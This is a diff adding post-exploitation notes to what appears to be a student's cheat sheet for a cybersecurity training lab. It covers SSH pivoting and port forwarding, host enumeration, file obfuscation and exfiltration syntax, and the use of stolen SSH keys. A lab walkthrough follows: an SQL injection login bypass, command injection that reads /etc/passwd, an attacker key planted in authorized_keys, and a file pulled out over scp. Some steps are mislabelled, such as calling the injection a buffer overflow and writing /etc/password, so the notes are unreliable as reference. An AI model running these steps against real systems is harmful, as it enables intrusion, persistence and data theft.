@@ -2824,3 +2824,275 @@ print s.recv(1024)
 
 s.close()
 ```
+
+
+
+
+# POST Exploitation
+https://sec.cybbh.io/public/security/latest/lessons/lesson-8-post_sg.html
+https://sec.cybbh.io/-/public/-/jobs/872115/artifacts/slides/08-post-exploitation.html
+
+# Pivoting and Redirection
+
+## Control Sockets (CMD)
+
+```
+ssh -M -S /tmp/s root@<IP ADDRESS> <TUNNEL COMMANDS -R or -L>
+
+ssh -S /tmp/s x@x
+scp -o 'ControlPath=/tmp/s' x@x:<Path>
+
+```
+
+
+## Enumeration (CMD)
+
+User enumeration
+
+WINDOWS :	net user
+LINUX : 	cat /etc/password
+
+
+Process Enumeration
+
+WINDOWS : 	tasklist /v
+LINUX : 	ps -elf
+
+
+Service Enumeration
+
+WINDOWS : 	tasklist /svc
+LINUX : 	chkconifg			# SysV
+		systemctl --type=service	# SystemD
+
+ 
+Network Connection Enumeration
+
+WINDOWS : 	ipconfig /all
+LINUX : 	ifconfig -a			# SysV
+		ip a				# SystemD
+		cat /etc/host
+
+## Exfiltration (CMD SYNTAX)
+
+Session Transcript
+
+ssh <user>@<host> | tee
+
+
+Obfuscation (Windows)
+
+type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
+certutil -encode <file> encoded.b64
+
+
+Obfuscation (Linux)
+
+cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
+cat <file>> | base64
+
+
+Encrypted Transport
+
+scp <source> <destination>
+ncat --ssl <ip> <port> < <file>
+
+## SCP SOCKET Commands (CMD)
+
+```
+
+ssh -MS /tmp/jump student@10.50.xx.xx
+
+ssh -S /tmp/jump jump -O forward -L 1234:{TargetIP}:2222
+
+
+
+
+scp <source> <destination>
+
+From LOCAL -------------------------------> {TargetIP}
+
+scp -P 1234 file.txt creds@127.0.0.1:/destination/location
+
+From {TargetIP} --------------------------> LOCAL
+
+scp -P 1234 creds@127.0.0.1:/source/destination .
+
+
+
+Pull from WINDOWS to LINUX using SCP
+
+
+```
+
+
+## SSH Overview
+```
+Basic Characteristics
+
+
+    Access remote systems using an SSH server as a proxy
+
+    Securely transfer files
+
+    Execute commands on a remote system
+
+    VPN using the SSH protocol as a transport
+
+    Forwarding the X Window System display to the client system
+
+```
+```
+Local Port Forward
+
+-L <USER PORT ON LOCAL>:TARGETHOST:TARGETPORT
+
+Remote Port Forward
+
+ssh USER@<PIVOT IP> -R <REMOTE PORT ON PIVOT>:TARGETHOST:TARGETPORT
+```
+
+WINDOWS SSH 
+```
+netsh interface portproxy add v4tov4 listenport=<LocalPort> listenaddress=<LocalIP> connectport=<TargetPort> connectaddress=<TargetIP> protocol=tcp
+netsh interface portproxy show all
+netsh interface portproxy delete v4tov4 listenport=<LocalPort>
+netsh interface portproxy reset
+
+```
+
+
+## SSH Keys
+```
+    SSH keys are asymetric(public/private) key pairs that can be used to authenticate a user to a system in combination with or to replace the use of a password
+
+    If you are able to find a users private ssh key it can potentially be used to gain access to other systems
+
+
+Using Stolen SSH Keys
+
+    Bring private key to your own box
+
+    On your box:
+
+chmod 600 /home/student/stolenkey
+ssh -i /home/student/stolenkey jane@1.2.3.4
+```
+
+
+## Stolen Key (CMD)
+```
+chmod 600 /home/student/stolenkey
+ssh -i /home/student/stolenkey jane@1.2.3.4
+```
+
+-i path
+Allows you to use the stolen ssh key for authentication
+
+
+
+
+# POST Exploit FLAGS
+## Extranet 5
+Created MS to the next host
+found port 80
+
+
+nmap --script http-enum <IP Address>
+
+PORT     STATE SERVICE
+80/tcp   open  http
+| http-enum: 
+|   /admin/: Possible admin folder
+|   /admin/login.php: Possible admin folder
+|_  /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+2222/tcp open  EtherNetIP-1
+
+
+From login page we can try to Buffer Overflow
+
+Username = admin' or 1 = '1
+Password = admin' or 1 = '1
+
+
+Admin Page:
+
+; semicolin allows us to stop the previoius command entry and write out owm
+
+
+ ;cat /etc/password
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/bin/bash
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+comrade:x:1001:1001::/home/comrade:/bin/bash
+mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
+
+
+;cat /etc/hosts
+
+127.0.0.1 localhost
+
+# The following lines are desirable for IPv6 capable hosts
+::1 ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+ff02::3 ip6-allhosts
+192.168.150.253 Donovian-Intranet
+
+From here we can go to LINOPS and 
+
+ssh-keygen -t rsa -b 4096 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDyrC1KeR1TEY6OpxamePqKwYRt2219rieZw7q5BbiEpK1V5gqHL32EDiruPRbahru81kyJIq9vdPmgs3IjAX+eU1Ef6gXG4kPh0k+Yu9EnEI/xcC9HM+CsX5Vtj7kZ6Nno3Liet9ytlbhVk11k9XlHFkw0twtPaU2RR7F2Z95T9l3w7UivE/RCEYqo9tlFUzHJf05l7CT0uIF46Z6ppTWzGI87865Vh75IqGYn6uWNzz7RT4RIac0DAlXfIt7qCU9G9fAhLLi2PJ8JHJIo7sjJGyG8ARxnMETDn+8AaCKkOhZBDy7aEmk1SAyqPRx7nIvhiAATQIVdcsROqbYMHXZ7Vhn00wLfGk9C/gK8le8IiD1C4XisET4JpiiFMmYf7xKimTr1d8SVGF/2XuA83Tk6MefDNQS0fVIv3JpV28QTP2lNfYHC2AwvyphwN+jyFjVXg6rjidultuVwq86SlDanyJ0mcrf7CVdPZyXYE6rO6K+fMxSZAc55CwsU43RZOOkhACFhUUUAoOQaJ6JmfLscmfjb80CnnBbCKH6ajqLfWADZqFCCyQZbClrGsHOJe2j6cVCdwcMwU/3DSaXS4w0X4iLD0FIYpycebKHgiJSoogixvBwE5REolJixVG+7nI7gGrL1YlQE8aNWEs9GjARuMVzOqgwkls6ULlCyHQeIoQ== student@lin-ops
+
+and copy this to a newly created dir on admin page into www-data home directory found in /etc/passwd as /var/www
+
+; mkdir /var/www/html/admin/.ssh
+
+;; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDyrC1KeR1TEY6OpxamePqKwYRt2219rieZw7q5BbiEpK1V5gqHL32EDiruPRbahru81kyJIq9vdPmgs3IjAX+eU1Ef6gXG4kPh0k+Yu9EnEI/xcC9HM+CsX5Vtj7kZ6Nno3Liet9ytlbhVk11k9XlHFkw0twtPaU2RR7F2Z95T9l3w7UivE/RCEYqo9tlFUzHJf05l7CT0uIF46Z6ppTWzGI87865Vh75IqGYn6uWNzz7RT4RIac0DAlXfIt7qCU9G9fAhLLi2PJ8JHJIo7sjJGyG8ARxnMETDn+8AaCKkOhZBDy7aEmk1SAyqPRx7nIvhiAATQIVdcsROqbYMHXZ7Vhn00wLfGk9C/gK8le8IiD1C4XisET4JpiiFMmYf7xKimTr1d8SVGF/2XuA83Tk6MefDNQS0fVIv3JpV28QTP2lNfYHC2AwvyphwN+jyFjVXg6rjidultuVwq86SlDanyJ0mcrf7CVdPZyXYE6rO6K+fMxSZAc55CwsU43RZOOkhACFhUUUAoOQaJ6JmfLscmfjb80CnnBbCKH6ajqLfWADZqFCCyQZbClrGsHOJe2j6cVCdwcMwU/3DSaXS4w0X4iLD0FIYpycebKHgiJSoogixvBwE5REolJixVG+7nI7gGrL1YlQE8aNWEs9GjARuMVzOqgwkls6ULlCyHQeIoQ== student@lin-ops" >> /var/www/.ssh/authorized_keys
+
+now create a MS from your localhost ssh port to the 192.168.28.100
+
+ssh -MS /tmp/key1 www-data@127.0.0.1 -p 8999
+
+now we 
+
+ssh www-data@127.0.0.1 -p 8999 -D 9050
+
+once we are on we can enumerate and we found a file now we need to exfil with it
+
+
+scp -P 8999 www-data@127.0.0.1:/home/comrade/Dekstop/network/map.png .
+map.png     100% 25kb 
+
+now we have it we can EOG (copy from linux to windows)
+
+pscp student@10.50.37.42:/home/student/map.png C:\Users\student\Desktop
